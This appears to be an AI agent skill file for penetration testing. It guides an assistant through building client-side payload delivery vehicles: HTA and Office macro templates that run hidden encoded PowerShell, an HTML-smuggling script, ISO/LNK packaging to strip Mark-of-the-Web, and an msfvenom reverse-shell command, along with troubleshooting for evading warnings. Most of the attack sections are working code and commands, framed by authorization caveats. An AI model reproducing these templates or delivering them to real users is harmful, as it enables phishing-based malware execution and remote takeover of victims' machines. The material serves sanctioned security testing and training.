---
name: client-side-attacks
description: >
  Craft client-side payload-delivery vehicles that fire on user action —
  HTA, Office macros (VBA), LNK, CHM, ISO/IMG container trick,
  HTML smuggling, OneNote/MSI side-load. Covers payload wrapping, AV-aware
  template choices, and the attacker-side HTTP delivery scaffolding. OSCP
  Client-side Attacks module. For raw payload bytes use preflight; for
  AV-signature evasion on the payload itself use av-edr-evasion.
keywords:
  - client-side attacks
  - HTA
  - macro
  - VBA macro
  - office macro
  - LNK payload
  - CHM payload
  - ISO container
  - HTML smuggling
  - OneNote payload
  - OSCP client-side
tools:
  - python3
  - msfvenom
  - genisoimage
  - mkisofs
opsec: high
---

# Client-Side Attacks (User-Interaction Payload Delivery)

You are helping a penetration tester craft a delivery vehicle that
executes a payload when a user opens / clicks / mounts it. All
testing is under explicit written authorization within the operator's
engagement scope — client-side attacks typically target an
authorized test user who agreed to click, or a controlled lab
environment. Never deliver a working payload to a real end user
outside that explicit scope.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[client-side-attacks] Activated → <vector>` on activation.
- **Evidence** → save the crafted artifact (`doc-macro.docm`,
  `payload.hta`, `shortcut.lnk`, `container.iso`), the serving-side
  HTTP log, and the callback transcript to
  `engagement/evidence/clientside-<ts>/`.

## Scope Boundary

This skill covers the DELIVERY VEHICLE (HTA/macro/LNK/container).
Raw payload bytes come from `tools/preflight/pick.py` or
`msfvenom`; AV-signature evasion on the shellcode itself is
`av-edr-evasion`. When a callback lands, **STOP** — hand the
shell to shell-mgr and let the orchestrator route privesc.

**Hard rule — benign payloads only in untargeted channels.** If
the operator has authorized a specific test user who agreed to
click, carry a real callback payload. If the delivery channel is
untargeted (dropped in a shared folder, uploaded to a public portal
as a test), the payload MUST be a benign canary (DNS/HTTP ping
back to the attackbox, no code execution beyond that). The
engagement scope says which model applies.

## State Management

Call `get_state_summary()`. Check for:
- Existing shell handlers (reuse the preflight-baked payload +
  live handler rather than minting a new one)
- Prior client-side attempts and which AV caught what
- `[blocked]` entries naming AV products in play

Report back:
- Vehicle type (HTA / macro / LNK / ISO / HTML smuggling)
- Payload class (reverse_tcp meterpreter / powershell_reverse_tcp /
  shell_reverse_tcp)
- Delivery URL
- Callback evidence
- Finding id

## Prerequisites

- A preflight-baked payload (`tools/preflight/pick.py --platform
  windows ...`) with a live handler. OSCP target: usually
  `windows/powershell_reverse_tcp` or `windows/meterpreter/reverse_tcp`.
- Attackbox serving the delivery URL (`python3 -m http.server`
  from `engagement/evidence/clientside-<ts>/`, or SMB share via
  `impacket-smbserver`).
- `genisoimage` / `mkisofs` on PATH for ISO/IMG vehicles.
- Authorized test user or lab environment confirmed with the operator.

## Attack Variants

### Variant A — HTA (classic OSCP vehicle)

`.hta` files run via `mshta.exe`, bypassing many script-exec policies
on older Windows. The user is lured to a URL like
`http://attackbox/update.hta`; IE / Edge offers to "Run" it.

```html
<!-- update.hta -->
<html><head><title>Update Required</title>
<HTA:APPLICATION ID="x" APPLICATIONNAME="Update" SCROLL="no" />
</head><body>
<script language="VBScript">
  Set s = CreateObject("WScript.Shell")
  s.Run "powershell -NoP -NonI -W Hidden -Exec Bypass " & _
        "-Enc <BASE64-ENCODED-ONE-LINER>", 0, False
  Self.Close
</script>
</body></html>
```

Encode the preflight ps1 one-liner with
`powershell -EncodedCommand`:
```bash
echo -n "<ps1 contents>" | iconv -t UTF-16LE | base64 -w0
```

Serve from a dir the operator approved; `python3 -m http.server 8080`.

### Variant B — Office VBA macro (DOCM / XLSM)

Modern Office opens docm/xlsm in Protected View; the user must
click "Enable Editing" and "Enable Macros". Keep the lure
plausible — timesheet / HR doc / IT update.

```vb
' Macro: Document_Open or Workbook_Open
Private Sub Document_Open()
  Dim shell As Object
  Set shell = CreateObject("WScript.Shell")
  shell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass " & _
            "-Enc <BASE64>", 0, False
End Sub
```

Build the docm:
```bash
# Easiest: open a blank .docx in LibreOffice Writer, add the macro
# via Tools → Macros → Edit, save as .docm, close.
# Fully headless: use python-docx + python-docx-template or
# oletools builders if available.
```

For hardened environments, use remote-template-injection: a .docx
pointing at a remote .dotm the attackbox serves. Bypasses some
Protected-View defaults.

### Variant C — LNK (shortcut file)

Windows shortcuts with `cmd.exe /c <cmd>` as the target run on
double-click. Pair with an ISO or ZIP to bypass Mark-of-the-Web
(MotW) in older Windows (MotW doesn't propagate through ISO mount).

```python
# Python builder — pywin32 or direct bytes with lnk-parser
# Simpler: use msfvenom
#   msfvenom -p windows/shell_reverse_tcp LHOST=.. LPORT=.. \
#            -f psh-reflection > payload.ps1
# Then wrap:
#   target: cmd.exe /c powershell -Enc <BASE64>
#   icon:   point at a plausible docx/xlsx icon
```

Build the LNK via `exiftool -T` or `pywin32` IShellLink interface.

### Variant D — ISO / IMG container

Modern Windows mounts ISO/IMG on double-click. Place a LNK inside
the ISO; MotW drops when crossing the ISO boundary, Office / Mark-
of-the-Web warnings disappear.

```bash
# Prepare dir with the real-looking filename:
mkdir /tmp/iso && cp report.lnk /tmp/iso/
mkisofs -o report.iso -V 'REPORT' /tmp/iso/
# Serve via HTTP or SMB; user downloads, double-clicks, double-clicks
# the LNK inside.
```

### Variant E — HTML smuggling

A benign-looking HTML page constructs the payload in-browser (JS
Blob + download), bypassing content-type-based filters at the
network boundary.

```html
<!-- download.html -->
<script>
const b64 = "<BASE64 of payload bytes>";
const bin = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
const blob = new Blob([bin], { type: 'application/octet-stream' });
const a = document.createElement('a');
a.href = URL.createObjectURL(blob);
a.download = 'invoice.zip';
document.body.appendChild(a);
a.click();
</script>
```

Pair with an ISO or ZIP container (above) for MotW stripping.

### Variant F — OneNote (.one) side-loaded payload

OneNote notebooks can embed executables that run on click.
Microsoft blocked common extensions in Office 2022.0421+ but
less-common ones (`.cmd`, `.hta`, `.vbs`, `.wsf`, `.chm`) may
still work on unpatched clients. Mirror the vector only when the
engagement document authorizes it — this family has heavy real-
world abuse.

### Variant G — CHM compiled help

Compile a `.chm` with an embedded script that fires on open. Needs
`hhc.exe` or a Windows machine; OSCP-era vector still works on
clients that lack Mark-of-the-Web enforcement.

## Verification Oracle

- **Callback received** on the preflight-baked handler with
  consistent attribution (timestamp aligned with the test-user
  trigger window, hostname / username matches the test lab).
  `confirmed`.
- **File downloaded only, no callback**: the vehicle was blocked at
  Protected View / SmartScreen / AV. `plausible` with the specific
  block screenshot — useful to the defender in remediation.

## Post-Attack Exit

Write the finding to `engagement/findings/<id>.json`:
- CWE-20 (Improper Input Validation) on the user side
- CWE-668 (Exposure of Resource to Wrong Sphere)
- OWASP A08 (Software and Data Integrity Failures)
- MITRE ATT&CK: T1204 (User Execution), T1566.001 (Spearphishing
  Attachment), T1218.005 (mshta)

STOP and return to the orchestrator with:
- Vehicle used + which AV / warning (if any) fired
- Delivery URL / artifact path
- Callback evidence
- Follow-ups:
  - Callback with user-level shell → win-enum / win-ops for
    privesc
  - If AV blocked → bypass teammate with the artifact for
    signature-evasion rework (chain to `av-edr-evasion`)

## Troubleshooting

### Macro blocked by Protected View / "Enable Content" never clicked

Expected on modern Office. If the engagement authorizes it, try
remote-template injection (Variant B's second form) — the lure
doc contains a macro-less reference, the macro lives in the
.dotm the attackbox serves.

### HTA 404s or opens as text instead of running

mshta is blocked (modern Windows AppLocker policies). Pivot to
Variant B (macro) or D (ISO + LNK). HTA is OSCP-exam-relevant
but increasingly dead in real engagements.

### Callback lands but shell dies instantly

The payload is a one-shot: Windows closed the parent cmd.exe
before `powershell` finished bootstrapping. Add `Start-Process`
in the HTA/macro to detach the child, or use
`conhost.exe /S powershell -...` to isolate the console.

### LNK on download triggers SmartScreen "Windows protected your PC"

MotW is attached. Pair with ISO/IMG container (Variant D) — MotW
doesn't propagate across the mount.
